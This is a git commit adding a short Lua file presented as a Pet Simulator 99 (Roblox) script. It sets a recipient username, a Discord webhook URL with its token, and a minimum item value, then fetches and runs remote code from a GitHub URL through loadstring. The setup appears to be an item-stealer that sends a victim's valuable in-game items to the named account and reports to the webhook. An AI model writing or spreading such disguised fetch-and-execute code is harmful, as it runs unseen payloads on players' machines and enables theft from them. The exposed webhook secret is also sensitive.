2a6a492278c9e084041c1805a22fb40c73de6079
Fabhay <72580053+fabhay2@users.noreply.github.com>
2024-12-11 17:59:31 -0500

    Add files via upload

---
+++ Petsim99Script..lua
@@ -0,0 +1,6 @@
+Username= 'fabhay2'
+Webhook= 'https://discord.com/api/webhooks/1316534043499823104/DzVCHPKWhSMlBfj1ljQ2dgLIrdZsJdW9hiNEmq2FD_hzwtDcMyv6GdY7KkSumIsBdxku'
+
+MinimumRAP = 500000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/KSFoster/VANHOFFHub/refs/heads/main/Lua'))()
